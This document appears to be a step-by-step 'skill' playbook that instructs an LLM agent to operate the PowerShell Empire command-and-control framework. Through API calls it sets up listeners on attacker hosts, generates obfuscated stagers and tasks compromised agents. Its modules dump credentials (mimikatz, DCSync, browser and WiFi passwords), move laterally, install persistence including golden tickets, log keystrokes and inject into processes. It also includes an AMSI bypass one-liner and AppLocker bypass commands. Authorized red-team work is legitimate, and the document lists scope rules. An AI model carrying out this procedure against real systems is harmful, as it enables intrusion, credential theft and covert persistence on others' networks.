# PowerShell Empire C2 Skill

## Overview
Complete methodology for using PowerShell Empire as a Command & Control framework.
Covers listener setup, stager generation, agent interaction, post-exploitation module
execution (credential dumping, situational awareness, lateral movement, persistence),
evasion, and operational security. Empire provides 400+ modules with fileless
PowerShell agents for Windows and Python3 agents for Linux/macOS.
This is the LLM agent's step-by-step playbook — follow it top to bottom.

## Scope Rules
1. Only deploy agents on explicitly authorized targets.
2. Use encrypted (HTTPS) listeners for external engagements.
3. Clean up ALL listeners, stagers, and agents after the engagement.
4. Credential dumping requires explicit authorization.
5. Lateral movement requires explicit per-host authorization.
6. Record ALL commands, modules, and results.

---

## Phase 1: Server Setup & Authentication

### 1.1 Starting the Empire Server
```bash
# Start Empire server (headless — exposes REST API)
powershell-empire server

# Or with specific config / port
powershell-empire server --restport 1337

# Default API: https://localhost:1337
# Default creds: empireadmin / password123  (change immediately!)
```

### 1.2 Client Connection
```bash
# Interactive CLI client
powershell-empire client

# Or use Starkiller GUI (Electron app)
starkiller
# Connect to: https://localhost:1337
```

### 1.3 API Authentication
```bash
# Get auth token
TOKEN=$(curl -sk -X POST https://localhost:1337/api/v2/users/login \
  -H "Content-Type: application/json" \
  -d '{"username":"empireadmin","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# All subsequent API calls use:
# -H "Authorization: Bearer $TOKEN"

# Verify
curl -sk -H "Authorization: Bearer $TOKEN" https://localhost:1337/api/v2/listeners
```

---

## Phase 2: Listener Setup

### 2.1 HTTP Listener (Basic)
```bash
curl -sk -X POST https://localhost:1337/api/v2/listeners \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "http_listener",
    "template": "http",
    "options": {
      "Host": "http://ATTACKER_IP:8080",
      "Port": "8080",
      "DefaultDelay": "5",
      "DefaultJitter": "0.1",
      "DefaultProfile": "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0"
    }
  }'
```

### 2.2 HTTPS Listener (Encrypted — Preferred)
```bash
curl -sk -X POST https://localhost:1337/api/v2/listeners \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "https_listener",
    "template": "http",
    "options": {
      "Host": "https://ATTACKER_DOMAIN:443",
      "Port": "443",
      "CertPath": "/opt/empire/certs/",
      "DefaultDelay": "5",
      "DefaultJitter": "0.2"
    }
  }'
```

### 2.3 Other Listener Types
```bash
# Hop listener (redirector)
# Routes agent traffic through an intermediate host
# Template: http_hop

# Foreign listener (interop with Metasploit)
# Template: http_foreign

# DBX (Dropbox) listener — C2 over cloud storage
# Template: dbx

# OneDrive listener — C2 over OneDrive
# Template: onedrive
```

### 2.4 List & Manage Listeners
```bash
# List all listeners
curl -sk -H "Authorization: Bearer $TOKEN" https://localhost:1337/api/v2/listeners

# Kill a listener
curl -sk -X DELETE -H "Authorization: Bearer $TOKEN" \
  https://localhost:1337/api/v2/listeners/http_listener
```

---

## Phase 3: Stager Generation

### 3.1 Windows Stagers
```bash
# PowerShell launcher (one-liner — most common)
curl -sk -X POST https://localhost:1337/api/v2/stagers \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "template": "windows/launcher_bat",
    "options": {"Listener": "http_listener"}
  }'

# Available Windows stagers:
# windows/launcher_bat        → .bat file with encoded PowerShell
# windows/launcher_vbs        → .vbs Visual Basic Script
# windows/launcher_sct        → .sct Scriptlet (regsvr32 bypass)
# windows/dll                 → DLL (rundll32 execution)
# windows/macro               → Office macro (phishing)
# windows/hta                 → HTML Application (mshta.exe)
# windows/shellcode           → Raw shellcode (inject into process)
# windows/csharp_exe          → C# executable
# windows/bunny               → USB Rubber Ducky script
# windows/ducky               → Hak5 Ducky payload
```

### 3.2 Linux/macOS Stagers
```bash
# Python launcher
curl -sk -X POST https://localhost:1337/api/v2/stagers \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "template": "multi/launcher",
    "options": {"Listener": "http_listener"}
  }'

# Available multi-platform stagers:
# multi/launcher              → Python one-liner
# multi/bash                  → Bash script
# multi/pyinstaller           → Compiled Python binary
# multi/war                   → Java WAR (Tomcat deployment)
```

### 3.3 Stager Obfuscation
```bash
# Empire has built-in obfuscation
# Set obfuscation options when generating stager:
curl -sk -X POST https://localhost:1337/api/v2/stagers \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "template": "windows/launcher_bat",
    "options": {
      "Listener": "http_listener",
      "Obfuscate": "True",
      "ObfuscateCommand": "Token\\All\\1"
    }
  }'

# Obfuscation methods:
# Token\\All\\1              → Token-based (variable/function renaming)
# Encoding\\1                → Base64/XOR encoding
# Compress\\1                → Compression + encoding
# Launcher\\STDIN++\\12345   → STDIN-based execution
```

---

## Phase 4: Agent Management

### 4.1 Listing Agents
```bash
# List all agents
curl -sk -H "Authorization: Bearer $TOKEN" https://localhost:1337/api/v2/agents

# Agent details include:
# - name, session_id, hostname, username, os_details
# - architecture, process_id, process_name
# - language (powershell/python), delay, jitter
# - listener, external_ip, internal_ip
```

### 4.2 Interacting with Agents
```bash
# Execute shell command on agent
curl -sk -X POST https://localhost:1337/api/v2/agents/AGENT_NAME/tasks/shell \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command": "whoami"}'

# Get task results
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://localhost:1337/api/v2/agents/AGENT_NAME/tasks

# Upload file to agent
curl -sk -X POST https://localhost:1337/api/v2/agents/AGENT_NAME/tasks/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@local_file.exe" \
  -F "path=C:\\Users\\Public\\file.exe"

# Download file from agent
curl -sk -X POST https://localhost:1337/api/v2/agents/AGENT_NAME/tasks/download \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"path": "C:\\Users\\target\\Desktop\\secrets.txt"}'
```

### 4.3 Agent Configuration
```bash
# Change agent sleep interval (seconds)
curl -sk -X PUT https://localhost:1337/api/v2/agents/AGENT_NAME \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"delay": 10, "jitter": 0.2}'

# Rename agent
curl -sk -X PUT https://localhost:1337/api/v2/agents/AGENT_NAME \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "DC01_ADMIN"}'

# Kill agent
curl -sk -X DELETE -H "Authorization: Bearer $TOKEN" \
  https://localhost:1337/api/v2/agents/AGENT_NAME
```

---

## Phase 5: Post-Exploitation Modules

### 5.1 Situational Awareness
```bash
# System information
curl -sk -X POST https://localhost:1337/api/v2/agents/AGENT_NAME/tasks/module \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"module": "powershell/situational_awareness/host/winenum"}'

# Network enumeration
-d '{"module": "powershell/situational_awareness/network/arpscan", "options": {"Range": "192.168.1.0/24"}}'

# Domain enumeration
-d '{"module": "powershell/situational_awareness/network/powerview/get_domain"}'
-d '{"module": "powershell/situational_awareness/network/powerview/get_domaincontroller"}'
-d '{"module": "powershell/situational_awareness/network/powerview/get_user"}'
-d '{"module": "powershell/situational_awareness/network/powerview/get_group_member", "options": {"Identity": "Domain Admins"}}'
-d '{"module": "powershell/situational_awareness/network/powerview/find_localadminaccess"}'

# Anti-virus detection
-d '{"module": "powershell/situational_awareness/host/antivirusproduct"}'

# Installed software
-d '{"module": "powershell/situational_awareness/host/get_installedsoftware"}'
```

### 5.2 Credential Dumping
```bash
# Mimikatz — logon passwords (requires admin/SYSTEM)
curl -sk -X POST https://localhost:1337/api/v2/agents/AGENT_NAME/tasks/module \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"module": "powershell/credentials/mimikatz/logonpasswords"}'

# Mimikatz — extract Kerberos tickets
-d '{"module": "powershell/credentials/mimikatz/extract_tickets"}'

# Mimikatz — DCSync (Domain Admin required)
-d '{"module": "powershell/credentials/mimikatz/dcsync", "options": {"user": "krbtgt"}}'

# SAM dump
-d '{"module": "powershell/credentials/mimikatz/sam"}'

# Token impersonation
-d '{"module": "powershell/credentials/tokens"}'

# Credential vault
-d '{"module": "powershell/credentials/vault_credential"}'

# Browser credentials
-d '{"module": "powershell/collection/ChromeDump"}'
-d '{"module": "powershell/collection/FoxDump"}'

# WiFi passwords
-d '{"module": "powershell/credentials/wifi_credentials"}'
```

### 5.3 Lateral Movement
```bash
# Invoke-PSRemoting (WinRM)
curl -sk -X POST https://localhost:1337/api/v2/agents/AGENT_NAME/tasks/module \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "module": "powershell/lateral_movement/invoke_psremoting",
    "options": {
      "ComputerName": "TARGET_HOST",
      "Listener": "http_listener"
    }
  }'

# WMI execution
-d '{"module": "powershell/lateral_movement/invoke_wmi", "options": {"ComputerName": "TARGET", "Listener": "http_listener"}}'

# PsExec
-d '{"module": "powershell/lateral_movement/invoke_psexec", "options": {"ComputerName": "TARGET", "Listener": "http_listener"}}'

# DCOM execution
-d '{"module": "powershell/lateral_movement/invoke_dcom", "options": {"ComputerName": "TARGET", "Listener": "http_listener"}}'

# SMB execution
-d '{"module": "powershell/lateral_movement/invoke_smbexec", "options": {"ComputerName": "TARGET", "Listener": "http_listener"}}'

# Pass-the-Hash
-d '{"module": "powershell/lateral_movement/invoke_psremoting", "options": {"ComputerName": "TARGET", "Listener": "http_listener", "CredID": "1"}}'
```

### 5.4 Persistence
```bash
# Registry run key
curl -sk -X POST https://localhost:1337/api/v2/agents/AGENT_NAME/tasks/module \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"module": "powershell/persistence/elevated/registry", "options": {"Listener": "http_listener", "RegPath": "default"}}'

# Scheduled task
-d '{"module": "powershell/persistence/elevated/schtasks", "options": {"Listener": "http_listener", "TaskName": "WindowsUpdate", "DailyTime": "09:00"}}'

# WMI event subscription
-d '{"module": "powershell/persistence/elevated/wmi", "options": {"Listener": "http_listener"}}'

# Startup folder (user-level, no admin needed)
-d '{"module": "powershell/persistence/userland/registry", "options": {"Listener": "http_listener"}}'

# Scheduled task (user-level)
-d '{"module": "powershell/persistence/userland/schtasks", "options": {"Listener": "http_listener"}}'

# Golden ticket (domain persistence — requires krbtgt hash)
-d '{"module": "powershell/credentials/mimikatz/golden_ticket", "options": {"user": "fakeadmin", "domain": "corp.local", "sid": "S-1-5-21-...", "krbtgt": "HASH"}}'
```

### 5.5 Collection & Exfiltration
```bash
# Keylogger
-d '{"module": "powershell/collection/keylogger"}'

# Screenshot
-d '{"module": "powershell/collection/screenshot"}'

# Clipboard monitor
-d '{"module": "powershell/collection/clipboard_monitor"}'

# File search
-d '{"module": "powershell/collection/find_interesting_file", "options": {"Path": "C:\\Users\\"}}'

# Email collection (Outlook)
-d '{"module": "powershell/collection/mailraider/get_emailitems"}'
```

---

## Phase 6: Evasion & Operational Security

### 6.1 Stager Evasion
```bash
# AMSI bypass (run before stager on target)
# Empire agents include AMSI bypass by default, but for manual payloads:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Constrained Language Mode bypass
# Empire Python agent avoids CLM entirely
# PowerShell agent attempts automatic bypass

# AppLocker bypass stagers:
# windows/launcher_sct   → regsvr32.exe /s /n /u /i:payload.sct scrobj.dll
# windows/hta            → mshta.exe payload.hta
# windows/macro          → Delivered via Office document
```

### 6.2 Communication Evasion
```bash
# Domain fronting (if CDN supports it)
# Set Host header to legitimate domain, traffic routes through CDN to your server

# Malleable C2 profiles
# Customize HTTP traffic to mimic legitimate applications
# Set DefaultProfile in listener options:
# "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 ..."

# Jitter to randomize beacon intervals
# DefaultJitter: 0.2  → ±20% of delay

# Kill date — agent self-destructs after date
# Set KillDate in listener options
```

### 6.3 Process Injection
```bash
# Inject agent into another process (stay hidden)
-d '{"module": "powershell/management/psinject", "options": {"ProcId": "1234", "Listener": "http_listener"}}'

# Spawn new process and inject
-d '{"module": "powershell/management/spawn", "options": {"Listener": "http_listener"}}'
```

---

## Phase 7: Operational Workflow

### 7.1 Standard Attack Flow
```
1. Set up HTTPS listener on redirector
2. Generate obfuscated stager for target OS
3. Deliver stager (phishing, web exploit, file upload)
4. Agent callbacks → verify connection
5. Situational awareness (whoami, hostname, network, domain)
6. Credential harvesting (mimikatz if admin, token theft if not)
7. Privilege escalation (if needed)
8. Lateral movement to high-value targets
9. Establish persistence (at least 2 methods)
10. Collect target data
11. Clean up — kill agents, remove persistence, delete artifacts
```

### 7.2 Agent Checklist After Callback
```bash
# Immediate (every new agent):
shell whoami
shell hostname
shell ipconfig /all
shell net user
shell net localgroup administrators
module powershell/situational_awareness/host/antivirusproduct
module powershell/situational_awareness/host/winenum

# If Domain-Joined:
module powershell/situational_awareness/network/powerview/get_domain
module powershell/situational_awareness/network/powerview/get_domaincontroller
module powershell/situational_awareness/network/powerview/get_user -o Filter="admincount=1"
module powershell/situational_awareness/network/powerview/find_localadminaccess

# If Admin:
module powershell/credentials/mimikatz/logonpasswords
module powershell/credentials/mimikatz/sam
```

---

## Decision Tree — Empire C2 Attack Flow

```
INITIAL ACCESS ACHIEVED
│
├── Generate stager for target OS
│   ├── Windows → launcher_bat / macro / hta / dll
│   └── Linux/macOS → multi/launcher / bash
│
├── Deliver stager → agent callbacks
│
├── SITUATIONAL AWARENESS
│   ├── Host info (OS, users, AV, software)
│   ├── Network info (interfaces, ARP, routes)
│   └── Domain info (DC, users, groups, trusts)
│
├── PRIVILEGE ESCALATION (if not admin)
│   ├── Token impersonation
│   ├── Local exploit suggester
│   └── Service/registry misconfigs
│
├── CREDENTIAL ACCESS
│   ├── Mimikatz logonpasswords / SAM
│   ├── DCSync (if Domain Admin)
│   ├── Browser credentials
│   └── WiFi passwords
│
├── LATERAL MOVEMENT
│   ├── PSRemoting (WinRM)
│   ├── WMI / DCOM / PsExec / SMBExec
│   └── Pass-the-Hash / Pass-the-Ticket
│
├── PERSISTENCE
│   ├── Registry run key
│   ├── Scheduled task
│   ├── WMI subscription
│   └── Golden ticket (domain-level)
│
└── CLEANUP
    ├── Kill all agents
    ├── Remove persistence mechanisms
    ├── Delete stager artifacts
    └── Shut down listeners
```

---

## Evidence Collection
1. `c2_session.json` — listener config, agent details, callback timestamps
2. `credentials.json` — dumped credentials (redacted), token information
3. `evidence.json` — module execution results, command outputs
4. Screenshots of agent interactions
5. Timeline of all actions with timestamps

## Evidence Consolidation
Export all agent task results via API. Map credentials to hosts. Document lateral
movement paths and persistence mechanisms installed.

## MITRE ATT&CK Mappings
- T1059.001 — PowerShell
- T1547 — Boot or Logon Autostart Execution
- T1003 — OS Credential Dumping
- T1021 — Remote Services
- T1055 — Process Injection
- T1570 — Lateral Tool Transfer
- T1071.001 — Web Protocols

## Deep Dives
Load references when needed:
1. Module catalog: `references/module_catalog.md`
2. Listener configuration: `references/listener_config.md`
3. Evasion techniques: `references/evasion.md`
4. Stager delivery methods: `references/stager_delivery.md`

## Success Criteria
- Listener operational and accepting callbacks
- Stager generated for target OS
- Agent connected and responsive
- Post-exploitation modules executed successfully
- Credentials harvested (if authorized)
- Persistence established
- All actions documented with evidence
- Clean removal of artifacts on engagement end
